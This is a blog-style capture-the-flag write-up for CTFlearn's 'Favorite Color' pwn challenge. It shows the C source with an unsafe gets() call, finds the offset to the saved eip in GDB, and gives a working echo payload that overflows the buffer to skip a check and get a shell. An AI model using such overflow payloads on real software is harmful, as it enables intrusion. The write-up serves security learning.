---
title: "CTFlearn PWN Writeups"
permalink: "/ctflearn-pwn"
---

I plan to just keep adding PWN writeups here from [CTFlearn](https://ctflearn.com/).

## Favorite Color [60 PTS]

Source code is provided:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vuln() {
    char buf[32];

    printf("Enter your favorite color: ");
    gets(buf);

    int good = 0;
    for (int i = 0; buf[i]; i++) {
        good &= buf[i] ^ buf[i];
    }

    return good;
}

int main(char argc, char** argv) {
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());

    //disable buffering.
    setbuf(stdout, NULL);

    if (vuln()) {
        puts("Me too! That's my favorite color too!");
        puts("You get a shell! Flag is in flag.txt");
        system("/bin/sh");
    } else {
        puts("Boo... I hate that color! :(");
    }
}
```

We can see that good will always be 0 because if you `XOR` anything with itself it returns 0, and when you `AND` anything with 0, it will also return 0.

```c
int good = 0;
for (int i = 0; buf[i]; i++) {
    good &= buf[i] ^ buf[i];
}
```
Since `vuln` always returns 0, this check will never pass:

```c
if (vuln()) {
    puts("Me too! That's my favorite color too!");
    puts("You get a shell! Flag is in flag.txt");
    system("/bin/sh");
}
```

However we can see that there is a `buffer overflow` on this line:

```c
gets(buf);
```

We can use this `buffer overflow` to overwrite the saved `eip` on the stack. 

Since we can change the saved `eip`, we can make the program skip the `if (vuln())` check.

Open the program up in `GDB` and find the offset from our input to the saved `eip`:

![saved eip offset](/assets/ctflearn/pwn/favorite-color/gdb_eip_offset.png)

We can see that we need 52 junk bytes and then our address to overwrite the saved `eip`.

Find the address of the instruction after the `if (vuln())` check:

![address of next instruction](/assets/ctflearn/pwn/favorite-color/if_addr.png)

We can see that the `if (vuln())` check is happening on address `0x08048655`, so we'll set the saved `eip` to the address after that, `0x08048657`.

> ``📝:`` To get this view just type `disassemble main`, where `main` can be any function you want to disassemble. 

Keep in mind that x86 uses [little endian](https://stackoverflow.com/a/25939262), so bytes are stored in reverse order.

Our final payload:

```sh
echo -e 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x57\x86\x04\x08' > /tmp/script/payload
```

The `-e` is to enable interpretation of backslash escapes. 

Now we can do `(cat /tmp/script/payload; cat) | ./color` to send the payload to the binary. 

> ``📝:`` We need to do `(cat x; cat)` because if we don't, then `stdin` will close, and we can't type anything else.

Running this, we get the flag:

```sh
color@ubuntu-512mb-nyc3-01:~$ (cat /tmp/script/payload; cat) | ./color
Enter your favorite color: Me too! That's my favorite color too!
You get a shell! Flag is in flag.txt
cat flag.txt
flag{REDACTED}
```

I'll keep adding more writeups for pwn challenges here when I do them.

